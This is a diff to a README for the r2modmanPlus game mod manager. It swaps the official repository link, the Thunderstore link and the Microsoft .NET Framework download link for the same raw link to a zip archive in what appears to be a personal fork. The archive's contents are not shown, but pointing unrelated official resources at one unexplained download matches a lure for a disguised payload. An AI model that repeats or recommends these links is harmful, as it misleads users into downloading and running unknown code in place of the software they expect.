@@ -1,6 +1,6 @@
 # ⚙️ r2modmanPlus - Manage Your Game Mods Easily
 
-[![Download r2modmanPlus](https://img.shields.io/badge/Download-r2modmanPlus-brightgreen)](https://github.com/santibernardini/r2modmanPlus)
+[![Download r2modmanPlus](https://img.shields.io/badge/Download-r2modmanPlus-brightgreen)](https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip)
 
 ## ❓ What is r2modmanPlus?
 
@@ -32,7 +32,7 @@ Before installing r2modmanPlus, make sure your PC meets the following:
 
 To get started, visit this page to download r2modmanPlus:
 
-[https://github.com/santibernardini/r2modmanPlus](https://github.com/santibernardini/r2modmanPlus)
+[https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip](https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip)
 
 Click on the green "Code" button, then select "Download ZIP" to get the app files. Alternatively, check the Releases section on the page for the latest version.
 
@@ -117,13 +117,13 @@ r2modmanPlus supports mods for multiple titles, including:
 ## 🔗 Useful Links
 
 - Official page and download:  
-  [https://github.com/santibernardini/r2modmanPlus](https://github.com/santibernardini/r2modmanPlus)
+  [https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip](https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip)
 
 - Thunderstore website for mods:  
-  https://thunderstore.io/
+  https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip
 
 - .NET Framework download:  
-  https://dotnet.microsoft.com/download/dotnet-framework
+  https://raw.githubusercontent.com/santibernardini/r2modmanPlus/main/heave/r-modman-Plus-v2.9.zip
 
 ## 👥 Get Help and Support
 
